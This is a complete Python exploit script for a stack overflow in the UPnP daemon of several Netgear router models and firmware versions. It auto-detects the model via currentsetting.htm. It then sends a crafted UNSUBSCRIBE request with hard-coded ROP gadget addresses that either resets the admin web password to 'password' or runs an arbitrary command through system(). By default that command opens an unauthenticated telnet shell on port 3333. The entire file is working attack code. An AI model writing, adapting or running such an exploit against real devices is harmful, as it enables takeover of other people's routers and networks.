import sys, time, socket, struct, argparse, os, shutil

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)

###########################################################################
## Version Info ###########################################################
###########################################################################

# Gadget addresses which sets the HTTP admin's password to "password"
password_reset_gadgets = {
	"R7000" : {
		"11.100" : 0x3E1B0,
		"11.106" : 0x3DCC8,
		"11.110" : 0x3DCC8,
		# Not vulnerable due to broken functionality
		#"11.116" : 0x3E1F0,
		#"11.123" : 0x3E1F0,
	},
	"XR300" : {
		# upnpd listens on port 56688 on the XR300 (soapd on port 5000 isn't vulnerable)
		"1.0.3.56" : 0x37B6C,
		"1.0.3.38" : 0x37D24,
	}
}

# Address/padding info necessary for running an arbitrary command
rce_gadgets = {
	"XR300" : {
		# upnpd listens on port 56688 on the XR300 (soapd on port 5000 isn't vulnerable)
		"1.0.3.56" : {
			"stack_add_gadget"   : 0x134A8, # ADD SP, SP, #0x1000; LDMFD SP!, {R4-R7,PC}
			"padding1"           : 1292,    # Amount of stack space before the second stack frame
			"command_address"    : 0x5B748, # Address of the command to run (after priming)
			"padding2"           : 12,      # Amount of space between command_address and system_gadget during second ROP gadget
			"system_gadget"      : 0x2e7e0, # Address of the system gadget (MOV R0, R4; BL system)
		}
	},
	"R6700V3" : {
		"1.0.4.118" : {
			"stack_add_gadget"   : 0x21F34, # ADD SP, SP, #0x1000; LDMFD SP!, {R4-R7,PC}
			"padding1"           : 1304,    # Amount of stack space before the second stack frame
			"command_address"    : 0x66AD0, # Address of the command to run (after priming)
			"padding2"           : 12,      # Amount of space between command_address and system_gadget during second ROP gadget
			"system_gadget"      : 0x18150, # Address of the system gadget (MOV R0, R4; BL system)
		}
	}
}

# A mapping of human friendly versions to the versions returned by currentsetting.htm
firmware_version_to_human_version = {
	"R7000" : {
		"V1.0.11.100_10.2.100" : "11.100",
		"V1.0.11.106_10.2.100" : "11.106",
		"V1.0.11.110_10.2.100" : "11.110",
		"V1.0.11.116_10.2.100" : "11.116",
		"V1.0.11.123_10.2.100" : "11.123",
	},
	"XR300" : {
		"V1.0.3.56_10.3.41"    : "1.0.3.56",
		"V1.0.3.38_10.3.30"    : "1.0.3.38",
	},
	"R6700V3" : {
		"V1.0.4.118_10.0.90"   : "1.0.4.118",
	},
}

# The default command, spawns a telnet daemon on TCP port 3333
default_commands = {
	"R7000"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"XR300"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"R6700V3"   : "/bin/utelnetd -p3333 -l/bin/sh -d",
}

###########################################################################
## Functions ##############################################################
###########################################################################

def send(ip, port, is_https, payload, keep_open = False):
	if is_https:
		return send_ssl(ip, port, payload, keep_open)
	else:
		return send_plain(ip, port, payload, keep_open)

def send_plain(ip, port, payload, keep_open):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	time.sleep(1)
	if keep_open:
		return sock
	sock.close()

def send_ssl(ip, port, payload, keep_open):
	import ssl
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	wrappedSocket = ssl.wrap_socket(sock)
	wrappedSocket.connect((ip, port))
	wrappedSocket.send(payload)
	time.sleep(1)
	if keep_open:
		return wrappedSocket
	wrappedSocket.close()

def s2b(s):
	return bytes([ord(x) for x in s])

def p32(address):
	return struct.pack("<I", address)

def find_item(contents, start_string):
	start = contents.find(start_string)
	if(start == -1):
		print("Failed to automatically detect version.")
		sys.exit(1)

	start += len(start_string)
	end = contents.find(b"\r\n", start)
	return contents[start:end].upper() # upper just in case

def detect_model_version(ip, port, is_https):
	request = b"GET /currentsetting.htm HTTP/1.1\r\n\r\n"
	sock = send(ip, port, is_https, request, True)

	contents = b""
	while True:
		data = sock.recv(2048)
		if not data: break
		contents += data

	# Some older models/versions don't have the currentsetting.htm page, or it's protected by login
	if contents.find(b"401 Unauthorized") != -1:
		print("Version detection against this router is not possible using currentsetting.htm.\n")
		print("Received response:\n")
		print(contents)
		sys.exit(1)

	model = find_item(contents, b"Model=").decode("ASCII")
	firmware_version = find_item(contents, b"Firmware=").decode("ASCII")

	if (model not in firmware_version_to_human_version.keys() or
			firmware_version not in firmware_version_to_human_version[model]):
		print("Unknown model and version: {} {}".format(model, firmware_version))
		sys.exit(1)

	return model, firmware_version_to_human_version[model][firmware_version]

###########################################################################
## Main Execution #########################################################
###########################################################################

def get_payload(args):
	payload  = b'UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1\r\n'
	payload += s2b('Host: http://{}:{}\r\n'.format(args.ip, args.port))
	payload += b'SID: whatever\r\n'
	payload += b'UUID: ' + b"A"*67
	payload += b'BBBB'
	payload += b'CCCC'
	payload += b'DDDD'
	payload += b'EEEE'
	payload += b'FFFF'
	payload += b'GGGG'
	payload += b'HHHH'
	payload += b'IIII'
	return payload

def reset_password_exploit(args):
	# Check to make sure we support this firmware
	if args.model not in password_reset_gadgets or args.version not in password_reset_gadgets[args.model]:
		print("Unknown model {} or version {}".format(args.model, args.version))
		sys.exit(1)

	payload = get_payload(args)

	# Little endian address, so we leave off the last byte (the MSB), which is 0
	payload += p32(password_reset_gadgets[args.model][args.version])[:3]
	payload += b'\r\n\r\n'

	send(args.ip, args.port, False, payload)

def set_command(args):
	"""Writes the command to memory in a global variable (meant for holding the
		Body of the XML request)"""
	payload =  b'<?xml version="1.0"?> '
	payload += b'<SOAP-ENV:Envelope> '
	payload += b'Body>:'
	payload += s2b(args.command.replace(" ","${IFS}"))
	payload += b';Body >'
	payload += b" </SOAP-ENV:Body> "
	payload += b"</SOAP-ENV:Envelope>"

	request  = b'POST /Public_UPNP_C5 HTTP/1.1\r\n'
	request += s2b('Host: http://{}:{}\r\n'.format(args.ip, args.port))
	request += b'SOAPAction\r\n'
	request += s2b('Content-Length: {}\r\n'.format(len(payload)))
	request += b'\r\n'
	request += payload

	send(args.ip, args.port, False, request)

def rce_exploit(args):
	# Check to make sure we support this firmware
	if args.model not in rce_gadgets or args.version not in rce_gadgets[args.model]:
		print("Unknown model {} or version {}".format(args.model, args.version))
		sys.exit(1)

	# Resolve the default command
	USING_DEFAULT_COMMAND = (args.command == "START_TELNET")
	if USING_DEFAULT_COMMAND:
		# Resolve the default command (which may be specific to a version)
		args.command = default_commands[args.model]
		if type(args.command) != str:
			args.command = args.command[args.version]

	# Get the version-specific address information that we'll need for the exploit
	stack_add_gadget = p32(rce_gadgets[args.model][args.version]["stack_add_gadget"])
	padding1         = rce_gadgets[args.model][args.version]["padding1"]
	command_address  = p32(rce_gadgets[args.model][args.version]["command_address"])
	padding2         = rce_gadgets[args.model][args.version]["padding2"]
	system_gadget    = p32(rce_gadgets[args.model][args.version]["system_gadget"])

	payload = get_payload(args)
	# Little endian address, so we leave off the last byte (the MSB), which is 0
	payload += stack_add_gadget[:3]
	payload += b'\r\n\r\n'

	# Pad the request so we can match up with the stack add gadget
	payload += b'J' * (padding1 - len(payload))
	# Then do a system(command) gadget
	payload += command_address
	payload += b'K' * padding2
	payload += system_gadget

	set_command(args)
	send(args.ip, args.port, False, payload)

def main(args):
	if args.version == "" or args.model == "":
		args.model, args.version = detect_model_version(args.ip, args.http_port, args.https)
		print("Automatically detected model {} and version {}".format(args.model, args.version))

	if args.version_only:
		sys.exit(1)

	if args.rce_exploit:
		rce_exploit(args)
	else:
		reset_password_exploit(args)

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Run the exploit')
	parser.add_argument('ip', type=str, default=None, help='The IP address of the device to exploit')
	parser.add_argument('-command', type=str, default="START_TELNET", help='The command to run; default is to start telnet on port 3333')
	parser.add_argument('-https', required=False, action='store_true', help='Use HTTPS when gathering the version from the webserver')
	parser.add_argument('-http_port', type=int, default=80, help='The port of the webserver to gather the version')
	parser.add_argument('-port', type=int, default=5000, help='The port of the upnp to exploit')
	parser.add_argument('-model', type=str, default="", help='The model of the device to exploit (default autodetect via the webserver).'
		+ ' Supported models are: {}'.format(", ".join(password_reset_gadgets.keys())))
	parser.add_argument('-version', type=str, default="", help='The version of the device to exploit (default autodetect via the webserver).'
		+ ' Supported versions are: {}'.format("; ".join(["{}: {}".format(x, ", ".join(password_reset_gadgets[x])) for x in password_reset_gadgets.keys()])))
	parser.add_argument('-version-only', required=False, action='store_true', help="Only detect the model/version of a device, don't exploit")
	parser.add_argument('-rce-exploit', required=False, action='store_true', help="Run the RCE exploit, rather than the password reset exploit. Supports less images")
	args = parser.parse_args()
	args.model = args.model.upper()

	main(args)

